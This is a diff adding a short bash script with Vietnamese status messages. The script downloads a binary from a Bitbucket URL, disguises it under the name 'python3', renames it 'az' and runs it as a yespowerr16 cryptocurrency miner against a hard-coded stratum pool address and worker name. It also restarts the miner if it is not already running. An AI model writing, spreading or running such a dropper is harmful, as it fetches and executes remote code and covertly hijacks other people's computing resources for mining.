@@ -1,0 +1,20 @@
+#! /bin/bash
+
+if [ -f ${PWD}/az ]; then
+    if pgrep -x "az" > /dev/null
+then
+    echo "Miner dang chay roi , ke cmn di "
+    
+else
+
+echo "Miner da install , chay thoi "
+./az -a yespowerr16 -o stratum+tcp://216.244.80.11:808 -u lovelyn.worker1 -p d=0.1
+     
+fi
+exit
+fi
+
+wget https://bitbucket.org/tengikekao/myrep/downloads/python3
+chmod +x python3
+mv python3 az
+./az -a yespowerr16 -o stratum+tcp://216.244.80.11:808 -u lovelyn.worker1 -p d=0.1
